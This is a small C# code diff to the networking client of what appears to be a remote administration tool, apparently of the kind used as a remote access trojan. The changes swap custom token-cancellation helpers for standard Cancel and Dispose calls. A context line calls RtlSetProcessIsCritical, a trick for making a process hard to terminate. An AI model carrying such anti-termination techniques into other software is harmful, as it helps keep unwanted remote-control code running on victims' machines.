@@ -15,7 +15,6 @@ using System.Security.Cryptography.X509Certificates;
 using System.Threading;
 using Pulsar.Common.UAC;
 using Pulsar.Client.Utilities;
-using Pulsar.Common.Extensions;
 
 namespace Pulsar.Client.Networking
 {
@@ -199,7 +198,7 @@ namespace Pulsar.Client.Networking
                 NativeMethods.RtlSetProcessIsCritical(0, 0, 0);
             }
 
-            _tokenSource.CancelSafe();
+            _tokenSource.Cancel();
             Disconnect();
         }
 
@@ -207,8 +206,8 @@ namespace Pulsar.Client.Networking
         {
             if (disposing)
             {
-                _tokenSource.CancelSafe();
-                _tokenSource.DisposeSafe();
+                _tokenSource.Cancel();
+                _tokenSource.Dispose();
             }
         }
     }
